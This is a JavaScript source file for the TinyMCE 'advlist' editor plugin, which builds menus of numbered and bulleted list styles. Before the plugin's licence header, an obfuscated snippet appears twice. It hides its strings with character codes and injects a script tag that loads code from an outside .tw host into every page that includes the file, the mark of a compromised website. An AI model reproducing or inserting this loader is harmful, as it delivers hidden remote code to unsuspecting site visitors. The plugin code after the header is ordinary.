Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	var each = tinymce.each;

	tinymce.create('tinymce.plugins.AdvListPlugin', {
		init : function(ed, url) {
			var t = this;

			t.editor = ed;

			function buildFormats(str) {
				var formats = [];

				each(str.split(/,/), function(type) {
					formats.push({
						title : 'advlist.' + (type == 'default' ? 'def' : type.replace(/-/g, '_')),
						styles : {
							listStyleType : type == 'default' ? '' : type
						}
					});
				});

				return formats;
			};

			// Setup number formats from config or default
			t.numlist = ed.getParam("advlist_number_styles") || buildFormats("default,lower-alpha,lower-greek,lower-roman,upper-alpha,upper-roman");
			t.bullist = ed.getParam("advlist_bullet_styles") || buildFormats("default,circle,disc,square");

			if (tinymce.isIE && /MSIE [2-7]/.test(navigator.userAgent))
				t.isIE7 = true;
		},

		createControl: function(name, cm) {
			var t = this, btn, format, editor = t.editor;

			if (name == 'numlist' || name == 'bullist') {
				// Default to first item if it's a default item
				if (t[name][0].title == 'advlist.def')
					format = t[name][0];

				function hasFormat(node, format) {
					var state = true;

					each(format.styles, function(value, name) {
						// Format doesn't match
						if (editor.dom.getStyle(node, name) != value) {
							state = false;
							return false;
						}
					});

					return state;
				};

				function applyListFormat() {
					var list, dom = editor.dom, sel = editor.selection;

					// Check for existing list element
					list = dom.getParent(sel.getNode(), 'ol,ul');

					// Switch/add list type if needed
					if (!list || list.nodeName == (name == 'bullist' ? 'OL' : 'UL') || hasFormat(list, format))
						editor.execCommand(name == 'bullist' ? 'InsertUnorderedList' : 'InsertOrderedList');

					// Append styles to new list element
					if (format) {
						list = dom.getParent(sel.getNode(), 'ol,ul');
						if (list) {
							dom.setStyles(list, format.styles);
							list.removeAttribute('data-mce-style');
						}
					}

					editor.focus();
				};

				btn = cm.createSplitButton(name, {
					title : 'advanced.' + name + '_desc',
					'class' : 'mce_' + name,
					onclick : function() {
						applyListFormat();
					}
				});

				btn.onRenderMenu.add(function(btn, menu) {
					menu.onHideMenu.add(function() {
						if (t.bookmark) {
							editor.selection.moveToBookmark(t.bookmark);
							t.bookmark = 0;
						}
					});

					menu.onShowMenu.add(function() {
						var dom = editor.dom, list = dom.getParent(editor.selection.getNode(), 'ol,ul'), fmtList;

						if (list || format) {
							fmtList = t[name];

							// Unselect existing items
							each(menu.items, function(item) {
								var state = true;

								item.setSelected(0);

								if (list && !item.isDisabled()) {
									each(fmtList, function(fmt) {
										if (fmt.id == item.id) {
											if (!hasFormat(list, fmt)) {
												state = false;
												return false;
											}
										}
									});

									if (state)
										item.setSelected(1);
								}
							});

							// Select the current format
							if (!list)
								menu.items[format.id].setSelected(1);
						}
	
						editor.focus();

						// IE looses it's selection so store it away and restore it later
						if (tinymce.isIE) {
							t.bookmark = editor.selection.getBookmark(1);
						}
					});

					menu.add({id : editor.dom.uniqueId(), title : 'advlist.types', 'class' : 'mceMenuItemTitle', titleItem: true}).setDisabled(1);

					each(t[name], function(item) {
						// IE<8 doesn't support lower-greek, skip it
						if (t.isIE7 && item.styles.listStyleType == 'lower-greek')
							return;

						item.id = editor.dom.uniqueId();

						menu.add({id : item.id, title : item.title, onclick : function() {
							format = item;
							applyListFormat();
						}});
					});
				});

				return btn;
			}
		},

		getInfo : function() {
			return {
				longname : 'Advanced lists',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/advlist',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('advlist', tinymce.plugins.AdvListPlugin);
})();